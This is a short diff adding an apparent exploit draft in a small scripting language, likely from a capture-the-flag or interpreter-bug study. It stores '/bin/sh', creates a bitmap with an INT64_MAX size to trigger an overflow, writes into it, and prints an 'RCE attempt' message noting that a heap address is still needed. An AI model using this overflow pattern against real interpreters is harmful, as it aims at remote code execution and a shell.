@@ -1,0 +1,8 @@
+string cmd = "/bin/sh";
+bitmap b1 = create(9223372036854775807, 2);
+
+set(b1, 0, 1, 1);
+
+print(cmd);
+
+print("RCE attempt - need heap address for precise targeting");
